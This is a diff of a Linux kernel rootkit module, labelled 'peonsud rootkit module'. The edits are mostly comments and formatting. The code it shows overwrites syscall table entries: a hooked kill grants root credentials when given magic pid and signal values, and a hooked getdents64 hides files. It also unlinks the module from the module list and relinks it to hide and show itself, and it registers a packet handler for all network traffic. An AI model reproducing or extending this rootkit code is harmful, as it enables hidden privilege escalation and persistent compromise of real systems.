@@ -46,8 +46,6 @@ unsigned long **find_syscall_table(void)
 	 
 	    return NULL;
      
-     
-     
 }
 
 
@@ -80,15 +78,14 @@ void enable_wp(void)
 /* Adress of the syscall table */
 unsigned long ** syscall_table ;
 
+/* save packet type */
 struct packet_type pt;
 
 /* save module */
  struct module *mod;
     
 /* -------------------------------------------------------------------- */
-/*long sys_kill ( pid_t pid, int sig);
- 
-*/
+
 asmlinkage long (*orig_getdents64) (unsigned int fd,  struct linux_dirent64 __user *dirent,  unsigned int count);
 
 asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __user *dirent, unsigned int count){
@@ -135,16 +132,16 @@ asmlinkage long hacked_call( pid_t pid, int sig)
     credz->suid=0;
     credz->sgid=0;
     credz->euid=0;
-    credz->egid=0; 
-
-    
+    credz->egid=0;     
     printk(KERN_ALERT "KILL 88 88 HIJACKED");
     }
-    if((pid ==22) &&(sig==22)){
-  
-    list_add(&mod->list,&find_module("snd")->list);
     
-    printk(KERN_ALERT "88 88 HIJACKED");
+/*   show hided module  */    
+    if((pid ==22) &&(sig==22))
+    {  
+/*  attach save module to the list of module by seaching snd module */    	
+    list_add(&mod->list,&find_module("snd")->list);    
+    printk(KERN_ALERT "show module");
     }
     return orig_call(pid,sig);
 }
@@ -170,7 +167,7 @@ int init_module(void)
     }
     printk(KERN_INFO "System call found at : 0x%lx\n", (unsigned long)syscall_table);
 	
-   /*hide module  lsmod*/    
+/*  hide module  lsmod */    
    // mod=THIS_MODULE;
    // list_del(&THIS_MODULE->list);
    
@@ -187,19 +184,19 @@ int init_module(void)
   syscall_table[__NR_kill] = (void*) hacked_call;
   
   
-  /*  Save the adress of the original syscall */
-   orig_getdents64= (void *) syscall_table[__NR_getdents64];
+/*  Save the adress of the original syscall */
+  orig_getdents64= (void *) syscall_table[__NR_getdents64];
    
 /*  Replace the syscall in the table */
   syscall_table[__NR_getdents64] = (void*) hacked_getdents64;
   
   
   
-
-	pt.type = htons(ETH_P_ALL);
-	//pt.dev = 0;
-	pt.func = toto;
-	dev_add_pack(&pt);
+/*  stuff for network, call toto function  */
+pt.type = htons(ETH_P_ALL);
+// pt.dev = 0;
+pt.func = toto;
+dev_add_pack(&pt);
   
 
    enable_wp(); 
@@ -225,4 +222,5 @@ void cleanup_module(void)
 }
 
 MODULE_LICENSE("GPL");
-
+MODULE_AUTHOR("Peondusud");
+MODULE_DESCRIPTION("peonsud rootkit module");
